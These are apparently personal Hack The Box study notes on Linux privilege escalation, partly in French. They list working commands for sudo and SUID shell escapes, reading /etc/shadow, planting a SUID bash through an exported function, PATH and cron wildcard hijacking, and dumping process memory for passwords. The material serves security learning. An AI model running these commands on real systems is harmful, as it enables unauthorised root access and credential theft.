# Privilege Escalation

## To add

hashes of passwd

## Disclaimer / Explanation

I know linpeas & linenum are good priv esc scripts, but as i'm new to that, all this information kinds of overwhelm me. I prefer to do it step by step myself.

So i'm going to describe what to check for step by step here. This is **heavily** taken from [hacktricks](https://book.hacktricks.xyz/) \(linpeas's author\), but i'm modifying some stuff and adding what I learned in hack the box.

It is still under development.

## Kernel exploits

* Check the kernel version with `cat /proc/version` or `uname -a`
* Use google and searchsploit to see if it's vulnerable
* There's also tools and compiled exploit available at [https://book.hacktricks.xyz/linux-unix/privilege-escalation\#kernel-exploits](https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits)

## Gain info on user

Get some basic info about users

```bash
id || (whoami && groups) 2> /dev/null # Me & my groups
cat /etc/passwd | cut -d: -f1 # All users
cat /etc/passwd | grep "sh$" # Users with console
awk -F: '($3 == "0") {print}' /etc/passwd # Superusers
w # Currently logged in users
last | tail # Login history
```

### Big UID

Some Linux versions were affected by a bug that allow users with **UID &gt; INT\_MAX** to escalate privileges. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74),  [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).  
**Exploit it** using: **`systemd-run -t /bin/bash`**

{% hint style="info" %}
I'll detail it more if i stumble upon it one day
{% endhint %}

## Sudo

### Exploits

Based on the vulnerable versions given in searchsploit, we can check if sudo is vulnerable with :

```bash
sudo -V | grep "Sudo ver" | grep "1.6.8p9\|1.6.9p18\|1.8.14\|1.8.20\|1.6.9p21\|1.7.2p4\|1\.8\.[0123]$\|1\.3\.[^1]\|1\.4\.\d*\|1\.5\.\d*\|1\.6\.\d*\|1.5$\|1.6$"
```

### Rights

Check what you can run with `sudo -l` :

* If permissions are to permissive, you may be able to priv esc just by using one of the authorized cmds
* There's also a lot of shell escapes, check [gtfobins](https://gtfobins.github.io/)

## SUID

See if you can hijack them in any way \(i'll give example later\)

```bash
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

## Exploit groups

{% hint style="info" %}
Those attacks seem interesting but i'm waiting to see them in action to detail them more
{% endhint %}

* [pkexec](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-1)
* [disk group](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#disk-group) \(Also in Hack the Box's [Falalel](https://www.youtube.com/watch?v=CUbWpteTfio)\)
* [video group](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#video-group)
* I won't detail here vulns linked to docker or lxc groups, i'll write a page about them if i use them one day.

{% hint style="info" %}
Ajouter la partie de hack the box, ou un groupe à plus de droits que nous donc on commence par l'obtenir.
{% endhint %}

## Hijack $PATH

If you can write in some folder referenced by `$PATH`, you can create a backdoor by writing a file named like a called binary. If it's called without an absolute path, or if your folder is before it's original one in the `$PATH`, yours is going to be used.

### Systemd

Les fichiers `.service` exécutent des commandes, tandis que les `.timer` exécutent des services et les `.socket` réagissent aux connexions. On peut donc utiliser les 3 pour créer une backdoor si comme pour `$PATH` on peut hijack un chemin.

## Processes

Check which process are running and if they have more rights than they should.

```bash
ps aux
top # Will update continuously
```

There's also tools like [pspy](https://github.com/DominicBreuker/pspy.git).

### Process memory

Some services of a server save **credentials in clear text inside the memory**. If you have access to the memory of an FTP service \(for example\) you could get the Heap and search inside it for credentials.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

## Dbus

{% hint style="info" %}
Read [https://book.hacktricks.xyz/linux-unix/privilege-escalation\#d-bus](https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus)
{% endhint %}

## Cron

Check crontab to see if relative paths \(same logic as with `$PATH`\), symbolic links or wildcards are used, or any weird/not secure stuff is done.

With wildcard you can do this kind of thing : 

```bash
# Line present in the root cron : 
rsync -a *.sh rsync://host.back/src/rbd 
# Create a file called "-e sh myscript.sh" to have the script execute our file
```

## Commands with sudo and suid commands

You could be allowed to execute some command using sudo or they could have the suid bit. Check it using:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Some **unexpected commands allows you to read and/or write files or even execute command.** For example:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

{% embed url="https://gtfobins.github.io/" %}

### Sudo execution bypassing paths

**Jump** to read other files or use **symlinks**. For example in sudeores file: _hacker10 ALL= \(root\) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

If a **wilcard** is used \(\*\), it is even easier:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

If the **sudo permission** is given to a single command **without specifying the path**: _hacker10 ALL= \(root\) less_ you can exploit it by changing the PATH variable

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

This technique can also be used if a **suid** binary **executes another command without specifying the path to it \(always check with** _**strings**_ **the content of a weird SUID binary\)**.

[Payload examples to execute.]()

### SUID binary with command path

If the **suid** binary **executes another command specifying the path**, then, you can try to **export a function** named as the command that the suid file is calling.

For example, if a suid binary calls _**/usr/sbin/service apache2 start**_ you have to try to create the function and export it:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Then, when you call the suid binary, this function will be executed

## Software exploit

```bash
dpkg -l #Debian
rpm -qa #Centos
```

If you have SSH access you can also use **openVAS** to check for vulnerable software.

## Hack the box

J'utilise évidemment les scripts, mais je voulais noter ici les éléments spécifiques à chercher pour résoudre certaines boxes.

* Fichiers `.bak` sensible ?
* **Ports** ouverts sur localhost ? \(Port forward si besoin\)
* Un job **cron** lancé par un utilisateur aura ces droits, donc si on arrive à faire en sorte que ce qu'il appelle lance un shell, on en aura un avec des droits
* Obtenir la liste de tout les fichiers own par root mais n'appartenant pas au groupe de root \(script custom\) : `find / -user root ! -group root -ls 2> /dev/null`
  * Si on arrive à devenir un des membres d'un de ces groupes et si un de ces fichiers nous permet de lancer une commande, celle-ci sera lancée en tant que root 
* Si on y a accès, check `.bash_history` pour voir s'il ne leak pas des mdp ou des fichiers intéressants
* Si on arrive sur un **serveur web,** chercher le fichier de config de la db et tenter de se co pour ensuite explorer les tables d'utilisateurs & co
* Si un script change les droits d'un fichier, si on fait un **lien symbolique** entre ce nom de fichier et un fichier qui nous intéresse, cela changera aussi les droits du fichier qui nous intéresse.



## Sources

* [Hack The Box](https://www.hackthebox.eu/)'s Exercices
* [Ippsec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)'s videos
* [Hacktricks](https://book.hacktricks.xyz/)

